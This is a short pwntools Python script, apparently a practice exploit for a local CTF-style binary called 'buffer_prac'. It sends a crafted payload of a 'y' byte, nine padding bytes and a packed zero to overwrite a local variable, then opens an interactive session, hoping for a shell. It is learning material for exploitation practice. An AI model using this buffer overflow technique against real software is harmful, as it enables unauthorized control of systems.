#!/usr/bin/python3

# process()
#  .recvline()  .recv()
#  .sendline()  .send()
#  .recvuntil()
#  .interactive() <--- useful for when we have gotten a shell :)
# p32()
# pause()

from pwn import *

p = process("./buffer_prac")
p.sendline("0")
p.recvuntil("y\\n")

payload = b''
payload += b'y'      # Pass cmp, al, 0x79
payload += b'A' * 9  # Add buffer content
payload += p32(0)    # Override the var_c with 0

p.sendline(payload)
p.interactive()

